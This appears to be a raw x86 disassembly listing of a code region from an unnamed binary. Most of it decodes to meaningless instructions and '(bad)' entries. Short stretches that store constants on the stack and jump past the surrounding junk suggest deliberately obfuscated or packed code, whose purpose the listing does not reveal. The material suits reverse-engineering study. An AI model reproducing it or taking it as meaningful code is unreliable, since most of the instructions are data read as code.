  42bd7e:	and    BYTE PTR [eax-0x3b],ch
  42bd81:	sub    DWORD PTR [esi],ebx
  42bd83:	stos   BYTE PTR es:[edi],al
  42bd84:	push   cs
  42bd85:	mov    esi,0x1d8e9dee
  42bd8a:	push   edi
  42bd8b:	inc    ebx
  42bd8c:	test   eax,0x9790c3b1
  42bd91:	jle    0x42bd2a
  42bd93:	sbb    dl,BYTE PTR [ebp+0x1b]
  42bd96:	dec    dl
  42bd98:	jl     0x42bd6f
  42bd9a:	and    DWORD PTR [eax],esi
  42bd9c:	test   BYTE PTR [esi-0x5bd8015a],bh
  42bda2:	dec    edi
  42bda3:	and    al,0x38
  42bda5:	out    dx,eax
  42bda6:	cmp    eax,0x3da41d7c
  42bdab:	or     al,0x79
  42bdad:	jbe    0x42bd5d
  42bdaf:	cmp    BYTE PTR ds:[edx+0x3b],dl
  42bdb3:	icebp  
  42bdb4:	je     0x42d682
  42bdba:	jmp    0x42be9a
  42bdbf:	mov    ebx,0xf4fba0ef
  42bdc4:	(bad)  
  42bdc5:	sti    
  42bdc6:	out    dx,eax
  42bdc7:	sbb    dl,al
  42bdc9:	push   edi
  42bdca:	fimul  WORD PTR [eax]
  42bdcc:	pop    edi
  42bdcd:	arpl   WORD PTR [edi+0x2095a],di
  42bdd3:	ret    
  42bdd4:	add    BYTE PTR [eax],al
  42bdd6:	add    BYTE PTR [esi],ah
  42bdd8:	mov    esi,0x2126f167
  42bddd:	out    dx,al
  42bdde:	outs   dx,DWORD PTR ds:[esi]
  42bddf:	push   ebp
  42bde0:	jns    0x42bdc7
  42bde2:	inc    esi
  42bde3:	push   ebp
  42bde4:	popa   
  42bde5:	call   0x63bdedb2
  42bdea:	inc    dx
  42bdec:	jo     0x42be46
  42bdee:	xlat   BYTE PTR ds:[ebx]
  42bdef:	inc    esp
  42bdf0:	hlt    
  42bdf1:	xor    BYTE PTR [edx-0x26],ch
  42bdf4:	or     eax,0x9dc4aa6d
  42bdf9:	lock cs inc ebx
  42bdfc:	repnz xchg esi,eax
  42bdfe:	ret    
  42bdff:	push   cs
  42be00:	push   ebp
  42be01:	fsub   QWORD PTR [esi]
  42be03:	jmp    0xdb68:0xd20d9a1
  42be0a:	ret    0x133b
  42be0d:	add    al,0xa6
  42be0f:	jo     0x42be4d
  42be11:	ret    0x4dbf
  42be14:	shl    BYTE PTR cs:[edx-0x3bc80ae1],1
  42be1b:	push   edx
  42be1c:	or     ch,BYTE PTR ds:0x64d452a5
  42be22:	(bad)
  42be25:	push   0x72
  42be27:	nop
  42be28:	push   ebp
  42be29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be2a:	loopne 0x42be4c
  42be2c:	xchg   ebx,eax
  42be2d:	push   esp
  42be2e:	push   es
  42be2f:	xor    al,0xec
  42be31:	dec    eax
  42be32:	ret    0x5933
  42be35:	xchg   DWORD PTR [ebp+0x4747c8e7],ebx
  42be3b:	test   eax,0x51ed401b
  42be40:	jmp    0x707846bd
  42be45:	ds pop ds
  42be47:	jmp    0x5c4c:0xa3235edf
  42be4e:	inc    esi
  42be4f:	xor    eax,0xd9f41cd5
  42be54:	and    BYTE PTR [esi+ebx*1-0x57],bh
  42be58:	(bad)  
  42be59:	es mov bl,0xc0
  42be5c:	inc    esp
  42be5d:	test   BYTE PTR [edx-0x74],ch
  42be60:	das    
  42be61:	xchg   esp,eax
  42be62:	sti    
  42be63:	cmp    BYTE PTR [ecx-0x25e06bd3],ah
  42be69:	mov    bh,0xe8
  42be6b:	fnstcw WORD PTR [ecx+0x344cd7cb]
  42be71:	sahf   
  42be72:	hlt    
  42be73:	dec    ebp
  42be74:	mov    ch,0x83
  42be76:	pop    esi
  42be77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be78:	hlt    
  42be79:	jae    0x42be39
  42be7b:	int    0xa7
  42be7d:	outs   dx,BYTE PTR ds:[esi]
  42be7e:	je     0x42be47
  42be80:	enter  0xbc53,0x46
  42be84:	adc    ebx,DWORD PTR [ecx+0x62]
  42be87:	out    dx,eax
  42be88:	popf   
  42be89:	xor    esp,DWORD PTR [edx+edx*4+0x6e]
  42be8d:	add    eax,edi
  42be8f:	into   
  42be90:	dec    ebx
  42be91:	outs   dx,DWORD PTR ds:[esi]
  42be92:	adc    eax,0x825bd2c8
  42be97:	or     BYTE PTR [eax+edx*4],0xb8
  42be9b:	jnp    0x42bed4
  42be9d:	add    BYTE PTR [eax],al
  42be9f:	jmp    0x42bf7f
  42bea4:	imul   edx,eax,0x1f
  42bea7:	add    al,0xbf
  42bea9:	iret   
  42beaa:	jnp    0x42beab
  42beac:	call   0xf8b7a335
  42beb1:	mov    al,0xf0
  42beb3:	cmp    DWORD PTR ds:0xc300020a,ebx
  42beb9:	add    BYTE PTR [eax],al
  42bebb:	add    dl,cl
  42bebd:	xor    edi,ecx
  42bebf:	data16 xor dh,0x10
  42bec3:	(bad)  
  42bec4:	cmp    cl,BYTE PTR [ebx-0x25]
  42bec7:	aaa    
  42bec8:	jb     0x42be85
  42beca:	mov    cl,0xd4
  42becc:	cdq    
  42becd:	mov    bh,0xb5
  42becf:	adc    BYTE PTR [ecx],ah
  42bed1:	inc    eax
  42bed2:	test   ecx,edi
  42bed4:	into   
  42bed5:	fstp   QWORD PTR [ebp+esi*1-0x28]
  42bed9:	cdq    
  42beda:	mov    al,ch
  42bedc:	ss iret 
  42bede:	xchg   edx,eax
  42bedf:	xor    al,0xc
  42bee1:	mov    WORD PTR [ecx+0x2425bb9c],es
  42bee7:	pop    ds
  42bee8:	and    ebp,DWORD PTR [ecx+0x6]
  42beeb:	add    BYTE PTR [esi+0x1],cl
  42beee:	add    eax,0xc512f18b
  42bef3:	xchg   ebx,eax
  42bef4:	push   es
  42bef5:	mov    esp,DWORD PTR [ebx+0x7b]
  42bef8:	(bad)  
  42bef9:	fdivr  DWORD PTR [eax+0x6979b3ed]
  42beff:	pop    ebp
  42bf00:	ss loope 0x42bee1
  42bf03:	pusha  
  42bf04:	mov    edx,0xf13bbf5c
  42bf09:	outs   dx,DWORD PTR ds:[esi]
  42bf0a:	pop    esp
  42bf0b:	mov    eax,0xae123a63
  42bf10:	dec    edx
  42bf11:	mov    edx,0x72676818
  42bf16:	lods   al,BYTE PTR ds:[esi]
  42bf17:	retf   0x5eb1
  42bf1a:	jmp    0x42bebe
  42bf1c:	push   eax
  42bf1d:	out    dx,eax
  42bf1e:	mov    dl,0xee
  42bf20:	fst    QWORD PTR [edi-0x3778f67e]
  42bf26:	cmp    cl,BYTE PTR [ecx]
  42bf28:	retf   0x10db
  42bf2b:	xchg   edx,eax
  42bf2c:	out    dx,eax
  42bf2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf2e:	(bad)  
  42bf2f:	mov    edx,0xa29d8f74
  42bf34:	cmp    ch,dh
  42bf36:	or     al,0xaa
  42bf38:	outs   dx,BYTE PTR ds:[esi]
  42bf39:	pop    es
  42bf3a:	sbb    eax,0x16142db2
  42bf3f:	popf   
  42bf40:	daa    
  42bf41:	loope  0x42bf79
  42bf43:	sbb    al,0x94
  42bf45:	cmp    DWORD PTR [eax+0x3bc8bd61],esi
  42bf4b:	popa   
  42bf4c:	pop    ecx
  42bf4d:	pop    ebp
  42bf4e:	loope  0x42bf25
  42bf50:	popa   
  42bf51:	cwde   
  42bf52:	jns    0x42bf7b
  42bf54:	add    eax,0x7fb2e66e
  42bf59:	xor    BYTE PTR [ebx+0x61161583],0xbd
  42bf60:	clc    
  42bf61:	pusha  
  42bf62:	inc    esi
  42bf63:	mov    ds:0x40a91157,eax
  42bf68:	inc    esp
  42bf69:	add    eax,0xf4bee0bd
  42bf6e:	sbb    BYTE PTR [ebx+0xe],0xe5
  42bf72:	das    
  42bf73:	mov    ecx,0x8fc6c127
  42bf78:	loopne 0x42bf76
  42bf7a:	out    dx,eax
  42bf7b:	fldenv [esi-0xc]
  42bf7e:	clc    
  42bf7f:	mov    WORD PTR [esp+0x30],ax
  42bf84:	mov    eax,0x426b
  42bf89:	mov    WORD PTR [esp+0x28],ax
  42bf8e:	mov    eax,0x7ceb
  42bf93:	mov    WORD PTR [esp+0x20],ax
  42bf98:	movzx  eax,WORD PTR [esp+0x20]
  42bf9d:	movzx  ecx,WORD PTR [esp+0x28]
  42bfa2:	jmp    0x42c082
  42bfa7:	mov    ah,0xfe
  42bfa9:	mov    eax,0xfec6fac6
  42bfae:	(bad)  
  42bfaf:	call   0x8c91bd43
  42bfb4:	mov    al,0xd2
  42bfb6:	int    0xe0
  42bfb8:	or     al,BYTE PTR [edx]
  42bfba:	add    bl,al
  42bfbc:	add    BYTE PTR [eax],al
  42bfbe:	add    BYTE PTR [edx],bh
  42bfc0:	dec    ecx
  42bfc1:	jp     0x42bff0
  42bfc3:	shr    dl,0x76
  42bfc6:	pop    ecx
  42bfc7:	xor    al,0x60
  42bfc9:	inc    esi
  42bfca:	sub    DWORD PTR [ebp+0x45f0df3f],eax
  42bfd0:	cmp    bh,ch
  42bfd2:	mov    eax,0x95876cce
  42bfd7:	popa   
  42bfd8:	or     eax,0x6273389e
  42bfdd:	pusha  
  42bfde:	jecxz  0x42c00e
  42bfe0:	ret    
  42bfe1:	(bad)  
  42bfe2:	into   
  42bfe3:	mov    ds:0x80bbdf9b,eax
  42bfe8:	in     al,dx
  42bfe9:	ficom  DWORD PTR [edi]
  42bfeb:	jg     0x42bffe
  42bfed:	mov    al,ds:0x156bc404
  42bff2:	call   0x2e2a:0xa14d692b
  42bff9:	mov    cl,0x73
  42bffb:	jge    0x42bfab
  42bffd:	add    bl,bh
  42bfff:	(bad)  
  42c000:	xchg   edx,eax
  42c001:	scas   al,BYTE PTR es:[edi]
  42c002:	ja     0x42bff9
  42c004:	mov    al,ds:0x81d0acb9
  42c009:	scas   al,BYTE PTR es:[edi]
  42c00a:	or     al,0xc5
  42c00c:	cdq    
  42c00d:	xor    esp,edx
  42c00f:	jb     0x42c036
  42c011:	mov    bl,0xa2
  42c013:	push   ss
  42c014:	sbb    eax,0xd1a88575
  42c019:	mov    BYTE PTR [ecx],cl
  42c01b:	outs   dx,BYTE PTR ds:[esi]
  42c01c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c01d:	mov    bh,0x96
  42c01f:	cmp    ah,cl
  42c021:	shr    BYTE PTR [ebx],cl
  42c023:	sti    
  42c024:	fld1   
  42c026:	in     al,dx
  42c027:	mov    fs,WORD PTR ds:0x987aa2b7
  42c02d:	cmp    al,0xff
  42c02f:	xchg   ebx,edx
  42c031:	or     ah,BYTE PTR [ebx-0x647c0996]
  42c037:	pop    DWORD PTR [esi-0x36]
  42c03a:	and    DWORD PTR [ecx-0x68],ebp
  42c03d:	int    0x52
  42c03f:	adc    al,0xff
  42c041:	jo     0x42c083
  42c043:	push   esi
  42c044:	fiadd  DWORD PTR [edx-0x21d6b803]
  42c04a:	lock repz aas 
  42c04d:	test   eax,0xc6cd3b9f
  42c052:	or     dh,0xa
  42c055:	aam    0x54
  42c057:	jmp    0x3ef4:0x8562ab3
  42c05e:	adc    edi,esi
  42c060:	sbb    BYTE PTR [eax+0x60],bl
  42c063:	idiv   DWORD PTR [esi-0x343a2a10]
  42c069:	mov    bh,0xf
  42c06b:	mov    cl,0xd1
  42c06d:	xchg   edi,eax
  42c06e:	add    al,BYTE PTR ds:0xcd1d2efc
  42c074:	ret    
  42c075:	cmp    DWORD PTR [ecx],esi
  42c077:	sbb    eax,0xca5050d
  42c07c:	mov    esp,0xd4347d79
  42c081:	jl     0x42c08e
  42c083:	ror    DWORD PTR [edi],0xb7
  42c086:	dec    esp
  42c087:	and    al,0x30
  42c089:	or     eax,0xdfe
  42c08e:	jmp    0x42c16e
  42c093:	mov    ds:0xe5e86026,eax
  42c098:	out    dx,al
  42c099:	stos   DWORD PTR es:[edi],eax
  42c09a:	outs   dx,DWORD PTR ds:[esi]
  42c09b:	and    ebp,DWORD PTR [edx+ebx*1-0x5be2a933]
  42c0a2:	mov    gs:0xc300020b,eax
  42c0a8:	add    BYTE PTR [eax],al
  42c0aa:	add    BYTE PTR [eax+0x281f2ad0],dl
  42c0b0:	jo     0x42c0f9
  42c0b2:	sbb    esi,DWORD PTR [edx]
  42c0b4:	xor    al,0xeb
  42c0b6:	scas   eax,DWORD PTR es:[edi]
  42c0b7:	mov    ebx,0xce6b6cd4
  42c0bc:	mov    dh,0x40
  42c0be:	mov    eax,0x5a662b38
  42c0c3:	in     al,0x97
  42c0c5:	stc    
  42c0c6:	jmp    0x18b2b39b
  42c0cb:	push   cs
  42c0cc:	fild   WORD PTR cs:[edi]
  42c0cf:	addr16 hlt 
  42c0d1:	dec    ebp
  42c0d2:	cmp    al,0xe6
  42c0d4:	ret    0xe91a
  42c0d7:	test   DWORD PTR [edi+0x75],0x3e9fa8b9
  42c0de:	loop   0x42c0fe
  42c0e0:	pop    edx
  42c0e1:	(bad)  
  42c0e2:	adc    DWORD PTR [ebp-0x898fc1e],esi
  42c0e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c0e9:	scas   al,BYTE PTR es:[edi]
  42c0ea:	retf   
  42c0eb:	mov    ch,0xf2
  42c0ed:	adc    eax,0xc235950
  42c0f2:	dec    ecx
  42c0f3:	pop    esp
  42c0f4:	pop    eax
  42c0f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c0f6:	or     edi,DWORD PTR [esi+eax*2-0x31]
  42c0fa:	outs   dx,DWORD PTR ds:[esi]
  42c0fb:	sbb    al,0x57
  42c0fd:	push   ebx
  42c0fe:	ins    DWORD PTR es:[edi],dx
  42c0ff:	and    edi,DWORD PTR [edi+ebx*2+0x4dadc61]
  42c106:	sbb    bh,BYTE PTR [ebx]
  42c108:	fnstcw WORD PTR [eax]
  42c10a:	out    dx,eax
  42c10b:	sub    BYTE PTR [ebx+0x61d5902c],bl
  42c111:	push   esi
  42c112:	mov    dh,0x16
  42c114:	push   es
  42c115:	sbb    DWORD PTR [edi+ebp*1-0x5b5690d5],esi
  42c11c:	popa   
  42c11d:	aas    
  42c11e:	pop    edi
  42c11f:	pushf  
  42c120:	pop    ecx
  42c121:	sbb    esp,esi
  42c123:	cmp    eax,DWORD PTR [edx+0x3b]
  42c126:	fistp  WORD PTR [eax]
  42c128:	or     eax,0x75b4146a
  42c12d:	outs   dx,BYTE PTR ds:[esi]
  42c12e:	sub    ebp,DWORD PTR [esi+0x69]
  42c131:	mov    dl,0xe4
  42c133:	xor    ebx,DWORD PTR [edx+0x46]
  42c136:	(bad)  
  42c137:	ins    DWORD PTR es:[edi],dx
  42c138:	stos   DWORD PTR es:[edi],eax
  42c139:	leave  
  42c13a:	jge    0x42c1b3
  42c13c:	pop    ebp
  42c13d:	xor    eax,0x1670934e
  42c142:	enter  0x376e,0x5c
  42c146:	add    eax,0xacb12508
  42c14b:	retf   0xf71e
  42c14e:	inc    esp
  42c14f:	mov    WORD PTR [edx+0x4d],?
  42c152:	mov    dl,0x84
  42c154:	pop    es
  42c155:	inc    ebp
  42c156:	dec    esp
  42c157:	lea    esp,[eax]
  42c159:	out    0x46,al
  42c15b:	ret    0x76b9
  42c15e:	push   cs
  42c15f:	popf   
  42c160:	mov    eax,ds:0x41e6b955
  42c165:	mov    al,ds:0x2fd2bb84
  42c16a:	adc    DWORD PTR [ebx],0xfffffff0
  42c16d:	dec    esp
  42c16e:	sub    eax,ecx
  42c170:	jmp    0x42c250
  42c175:	add    edi,edx
  42c177:	inc    edx
  42c178:	stos   BYTE PTR es:[edi],al
  42c179:	sti    
  42c17a:	mov    edx,0x2d1ffbeb
  42c17f:	push   0x302beb5f
  42c184:	cmp    DWORD PTR [esi+0xc],esp
  42c187:	add    al,BYTE PTR [eax]
  42c189:	ret    
  42c18a:	add    BYTE PTR [eax],al
  42c18c:	add    BYTE PTR [esi-0x77367905],bh
  42c192:	stos   DWORD PTR es:[edi],eax
  42c193:	pop    es
  42c194:	mov    esp,0x60dc3316
  42c199:	test   DWORD PTR [ebp+0x22507131],eax
  42c19f:	or     BYTE PTR [ecx+ecx*1],ch
  42c1a2:	cmp    ah,BYTE PTR [ecx-0x2404ee6]
  42c1a8:	inc    eax
  42c1a9:	mov    eax,0x491b06a0
  42c1ae:	dec    eax
  42c1af:	iret   
  42c1b0:	(bad)  
  42c1b1:	mov    bl,0x17
  42c1b3:	cdq    
  42c1b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c1b5:	out    0x8b,eax
  42c1b7:	xchg   ebp,eax
  42c1b8:	inc    ebx
  42c1b9:	or     BYTE PTR [edx+0x44],0x24
  42c1bd:	pusha  
  42c1be:	dec    eax
  42c1bf:	mov    esi,0x8c239b21
  42c1c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c1c5:	mov    dh,0xad
  42c1c7:	in     al,dx
  42c1c8:	dec    ebx
  42c1c9:	sub    ah,BYTE PTR ds:0xba99e71b
  42c1cf:	mov    ds:0x97b76106,al
  42c1d4:	popa   
  42c1d5:	pop    esi
  42c1d6:	xor    DWORD PTR [ebp+0x27],0x5b4c1af3
  42c1dd:	xlat   BYTE PTR ds:[ebx]
  42c1de:	in     eax,dx
  42c1df:	add    eax,DWORD PTR [ecx]
  42c1e1:	fnstcw WORD PTR [edi+0x27]
  42c1e4:	mov    eax,0x81fd15f
  42c1e9:	ret    
  42c1ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c1eb:	gs mov ecx,0x18d09c06
  42c1f1:	dec    edx
  42c1f2:	mov    gs,WORD PTR [ebx+eiz*2+0x55383539]
  42c1f9:	xchg   DWORD PTR ds:0x2745422a,esi
  42c1ff:	add    esi,DWORD PTR ds:0x51b0cef5
  42c205:	pusha  
  42c206:	call   0xd21f6282
  42c20b:	inc    ebx
  42c20c:	repz jno 0x42c1d4
  42c20f:	fwait
  42c210:	push   esp
  42c211:	mov    al,ds:0x15e95e93
  42c216:	in     eax,dx
  42c217:	cmp    ebp,esi
  42c219:	push   ss
  42c21a:	in     al,dx
  42c21b:	ds mov ecx,0xba74250a
  42c221:	fsub   st,st(5)
  42c223:	push   ecx
  42c224:	cmc    
  42c225:	cld    
  42c226:	mov    esi,0xd83aaeb9
  42c22b:	cmp    ah,al
  42c22d:	add    dh,BYTE PTR [ebp+0x14]
  42c230:	and    BYTE PTR [eax],al
  42c232:	inc    ebp
  42c233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c234:	adc    dl,BYTE PTR [esi-0x16]
  42c237:	mov    dl,0xf7
  42c239:	sbb    cl,ah
  42c23b:	or     BYTE PTR ds:0x710bce49,ah
  42c241:	inc    ebp
  42c242:	dec    ecx
  42c243:	data16 mov al,ds:0xed26798b
  42c249:	jmp    0x42c2b0
  42c24b:	mov    ebx,0xaf5b2a00
  42c250:	mov    WORD PTR [esp+0x28],ax
  42c255:	jmp    0x42c335
  42c25a:	and    BYTE PTR [ebp-0x725a7760],ah
  42c260:	sub    BYTE PTR [ebp+0x65670e49],ch
  42c266:	shl    DWORD PTR [ebx-0x2f],0x70
  42c26a:	sub    DWORD PTR ds:0xc30002,ecx
  42c270:	add    BYTE PTR [eax],al
  42c272:	pop    ebx
  42c273:	xchg   ecx,eax
  42c274:	out    dx,al
  42c275:	jbe    0x42c278
  42c277:	add    eax,0x43479d78
  42c27c:	in     eax,0x20
  42c27e:	ds cdq 
  42c280:	mov    eax,ds:0xe61e0ab8
  42c285:	xor    edi,DWORD PTR [ebp+eax*4-0x4c]
  42c289:	inc    edi
  42c28a:	ja     0x42c2db
  42c28c:	test   BYTE PTR [eax],cl
  42c28e:	(bad)  
  42c28f:	jl     0x42c287
  42c291:	int3   
  42c292:	out    dx,eax
  42c293:	jecxz  0x42c292
  42c295:	dec    esi
  42c296:	in     eax,0x40
  42c298:	loop   0x42c2cf
  42c29a:	pop    ss
  42c29b:	xor    eax,0x72cc8d63
  42c2a0:	xchg   edx,eax
  42c2a1:	add    eax,0xb2b73390
  42c2a6:	mov    edx,0x37c8ef52
  42c2ab:	or     dl,BYTE PTR [ebx+0x13931f0b]
  42c2b1:	or     DWORD PTR [ebx],esi
  42c2b3:	add    eax,0x74e512e9
  42c2b8:	arpl   ax,si
  42c2ba:	push   0x513dbbf7
  42c2bf:	cmc    
  42c2c0:	add    eax,0x2a61969f
  42c2c5:	(bad)  
  42c2c6:	mov    edi,0x6f3aa376
  42c2cb:	sbb    eax,0x7b0b55c1
  42c2d0:	adc    esp,DWORD PTR [edx-0x19d243d8]
  42c2d6:	stc    
  42c2d7:	jecxz  0x42c322
  42c2d9:	fcom   QWORD PTR [edx]
  42c2db:	mov    ebp,edi
  42c2dd:	push   ebp
  42c2de:	outs   dx,DWORD PTR ds:[esi]
  42c2df:	aam    0xe5
  42c2e1:	cdq    
  42c2e2:	loopne 0x42c2fc
  42c2e4:	outs   dx,DWORD PTR ds:[esi]
  42c2e5:	inc    DWORD PTR [eax+0x5a0b2747]
  42c2eb:	sub    DWORD PTR [eax+0x5202fb7],edx
  42c2f1:	cwde   
  42c2f2:	stc    
  42c2f3:	out    dx,eax
  42c2f4:	pop    edx
  42c2f5:	inc    edi
  42c2f6:	xor    al,0xb0
  42c2f8:	mov    ebp,0x36527ec8
  42c2fd:	jmp    0x3b9e2c23
  42c302:	xchg   esp,eax
  42c303:	jmp    0x853c:0xaf1c91ef
  42c30a:	mov    bl,0x1d
  42c30c:	fimul  WORD PTR [eax-0x1a]
  42c30f:	jl     0x42c2fe
  42c311:	add    al,0x24
  42c313:	pusha  
  42c314:	sbb    eax,0xe2a5f2e3
  42c319:	in     al,dx
  42c31a:	or     BYTE PTR [eax+0x125f806c],bh
  42c320:	aad    0x2d
  42c322:	xchg   edi,eax
  42c323:	lahf   
  42c324:	mov    BYTE PTR [ecx+ebx*1-0x1d7cf97b],dl
  42c32b:	(bad)  
  42c32c:	push   0xa4b40c8b
  42c331:	repnz sub eax,0x99b89c37
  42c337:	dec    esi
  42c338:	add    BYTE PTR [eax],al
  42c33a:	mov    WORD PTR [esp+0x20],ax
  42c33f:	movzx  eax,WORD PTR [esp+0x20]
  42c344:	mov    cx,WORD PTR [esp+0x28]
  42c349:	add    eax,0x388c
  42c34e:	jmp    0x42c42e
  42c353:	push   ecx
  42c354:	jle    0x42c2e4
  42c356:	gs scas eax,DWORD PTR es:[edi]
  42c358:	cmc    
  42c359:	sti    
  42c35a:	jle    0x42c373
  42c35c:	and    dl,BYTE PTR [esi-0x1821148c]
  42c362:	add    ch,ah
  42c364:	or     eax,0xc30002
  42c369:	add    BYTE PTR [eax],al
  42c36b:	cmp    al,0xe7
  42c36d:	fwait
  42c36e:	or     BYTE PTR [esi+ebx*8-0x79],al
  42c372:	shr    DWORD PTR [ecx+edi*8-0x15],0xe
  42c377:	push   esp
  42c378:	clc    
  42c379:	repz pop es
  42c37b:	mov    ch,0xbe
  42c37d:	push   ecx
  42c37e:	mov    esi,0xaa31dd5c
  42c383:	jb     0x42c361
  42c385:	xchg   ebp,eax
  42c386:	sub    BYTE PTR [esi+0x4b],bh
  42c389:	push   es
  42c38a:	push   ss
  42c38b:	inc    edx
  42c38c:	inc    ebp
  42c38d:	bound  esi,QWORD PTR [ecx+0x31]
  42c390:	pop    es
  42c391:	xor    eax,0x7a2fcb6d
  42c396:	push   esp
  42c397:	retf   
  42c398:	sub    al,0xcd
  42c39a:	sbb    edi,esi
  42c39c:	addr16 cmp eax,0x79cef062
  42c3a2:	mov    ecx,0xd80753b6
  42c3a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3a8:	fs push ecx
  42c3aa:	cmc    
  42c3ab:	inc    dh
  42c3ad:	sbb    eax,0x483fa352
  42c3b2:	into   
  42c3b3:	push   ss
  42c3b4:	xor    ebp,ebp
  42c3b6:	sub    ah,dl
  42c3b8:	mov    ch,0x84
  42c3ba:	cwde   
  42c3bb:	xchg   ecx,eax
  42c3bc:	push   eax
  42c3bd:	sub    ebx,ecx
  42c3bf:	mul    dh
  42c3c1:	in     eax,0x7e
  42c3c3:	sar    DWORD PTR [edx],cl
  42c3c5:	xchg   DWORD PTR [ebp-0x4622a82d],esi
  42c3cb:	mov    edi,0xeaf9eef
  42c3d0:	repz inc ecx
  42c3d2:	pop    ds
  42c3d3:	shl    ah,0x24
  42c3d6:	ss icebp 
  42c3d8:	jge    0x42c408
  42c3da:	aad    0xf1
  42c3dc:	cwde   
  42c3dd:	xchg   BYTE PTR [esi+edi*8+0x573fda73],ah
  42c3e4:	scas   eax,DWORD PTR es:[edi]
  42c3e5:	jmp    0x42c448
  42c3e7:	stc    
  42c3e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c3e9:	xchg   esp,eax
  42c3ea:	mov    eax,0x216063bd
  42c3ef:	das    
  42c3f0:	dec    ebp
  42c3f1:	mov    es,edi
  42c3f3:	add    al,0xcd
  42c3f5:	xor    BYTE PTR ss:[esi-0x5d],ch
  42c3f9:	dec    ecx
  42c3fa:	mov    ebx,0x726e4479
  42c3ff:	mov    dh,BYTE PTR [ebx]
  42c401:	jle    0x42c43e
  42c403:	stos   DWORD PTR es:[edi],eax
  42c404:	cli    
  42c405:	test   DWORD PTR [ebp+0x27d7fc8a],0x54551efe
  42c40f:	mov    ebp,0x9a09fe64
  42c414:	(bad)  
  42c415:	lds    ebx,FWORD PTR [ecx-0x6ff8c196]
  42c41b:	retf   
  42c41c:	and    edi,DWORD PTR [esi+0x54080e6e]
  42c422:	sbb    cl,BYTE PTR [edi-0x28f90665]
  42c428:	(bad)  
  42c429:	cmp    dh,bh
  42c42b:	fsubp  st(4),st
  42c42d:	inc    esp
  42c42e:	movzx  ecx,cx
  42c431:	and    eax,0x66c4
  42c436:	jmp    0x42c516
  42c43b:	mov    ecx,0x654420dc
  42c440:	cld    
  42c441:	std    
  42c442:	std    
  42c443:	ds jne 0x42c3cd
  42c446:	lahf   
  42c447:	aaa    
  42c448:	xor    ch,BYTE PTR [ebx]
  42c44a:	je     0x42c3fb
  42c44c:	push   cs
  42c44d:	add    al,BYTE PTR [eax]
  42c44f:	ret    
  42c450:	add    BYTE PTR [eax],al
  42c452:	add    BYTE PTR [ebp+edx*2+0x44],cl
  42c456:	dec    ecx
  42c457:	mov    edi,0xb05d8c04
  42c45c:	jae    0x42c4b8
  42c45e:	les    esi,FWORD PTR fs:[ebp+0x24]
  42c462:	out    dx,al
  42c463:	cld    
  42c464:	kunpckbw k4,k7,k1
  42c468:	test   eax,0xb487f173
  42c46d:	dec    esp
  42c46e:	adc    edi,DWORD PTR [esi-0x765dba36]
  42c474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c475:	pop    ds
  42c476:	jns    0x42c488
  42c478:	and    edx,edi
  42c47a:	mov    esi,DWORD PTR [edi+edx*2-0x4b52f732]
  42c481:	ror    DWORD PTR [esi+ebp*8-0x2c],1
  42c485:	lock sbb DWORD PTR [esi],0x9f9ff61e
  42c48c:	xchg   esp,eax
  42c48d:	or     ah,BYTE PTR [ebx+edx*4+0x28e9b6f4]
  42c494:	pop    eax
  42c495:	mov    esi,0xee9a236c
  42c49a:	inc    DWORD PTR [esi+0x17266137]
  42c4a0:	call   0xc4d07a42
  42c4a5:	out    0x7d,eax
  42c4a7:	loop   0x42c488
  42c4a9:	push   ss
  42c4aa:	test   eax,0x6c5fbbb2
  42c4af:	je     0x42c46f
  42c4b1:	push   es
  42c4b2:	aaa    
  42c4b3:	jne    0x42c443
  42c4b5:	jo     0x42c4a0
  42c4b7:	jbe    0x42c4c3
  42c4b9:	and    ah,BYTE PTR [edi-0x6a06a53]
  42c4bf:	xchg   DWORD PTR [edi*1-0x37325e61],edx
  42c4c6:	push   ss
  42c4c7:	push   edx
  42c4c8:	jg     0x42c48e
  42c4ca:	push   es
  42c4cb:	push   es
  42c4cc:	mov    edx,0x2b12104c
  42c4d1:	lds    esi,FWORD PTR [ebx-0x2ebcffce]
  42c4d7:	stos   BYTE PTR es:[edi],al
  42c4d8:	push   edx
  42c4d9:	push   esi
  42c4da:	shl    DWORD PTR [ecx-0x13eb6708],cl
  42c4e0:	iret   
  42c4e1:	iret   
  42c4e2:	scas   al,BYTE PTR es:[edi]
  42c4e3:	mov    WORD PTR [ebx+0x1d],ss
  42c4e6:	xor    ebp,DWORD PTR [ebx]
  42c4e8:	xchg   edx,eax
  42c4e9:	sub    ah,BYTE PTR ds:0x8b750b2d
  42c4ef:	xchg   ebp,eax
  42c4f0:	lods   al,BYTE PTR ds:[esi]
  42c4f1:	scas   al,BYTE PTR es:[edi]
  42c4f2:	inc    edx
  42c4f3:	push   ds
  42c4f4:	mov    al,ds:0xde9710e2
  42c4f9:	(bad)  
  42c4fa:	ret    0xd80f
  42c4fd:	(bad)  
  42c4fe:	ja     0x42c4cd
  42c500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c501:	stos   BYTE PTR es:[edi],al
  42c502:	sbb    BYTE PTR [eax-0x398a3b69],al
  42c508:	out    0x99,eax
  42c50a:	sub    bh,BYTE PTR ds:0x284ab49b
  42c510:	xor    ecx,DWORD PTR [eax]
  42c512:	andnps xmm4,xmm3
  42c515:	dec    ebx
  42c516:	cmp    eax,ecx
  42c518:	jg     0x42d682
  42c51e:	jmp    0x42c5fe
  42c523:	sbb    dh,bh
  42c525:	push   ss
  42c526:	mov    ?,edi
  42c528:	out    dx,eax
  42c529:	call   0xc74e:0x80fd30f7
  42c530:	xor    al,0xb0
  42c532:	fidiv  WORD PTR [edx+0xf]
  42c535:	add    al,BYTE PTR [eax]
  42c537:	ret    
  42c538:	add    BYTE PTR [eax],al
  42c53a:	add    BYTE PTR [ecx+0x4f],al
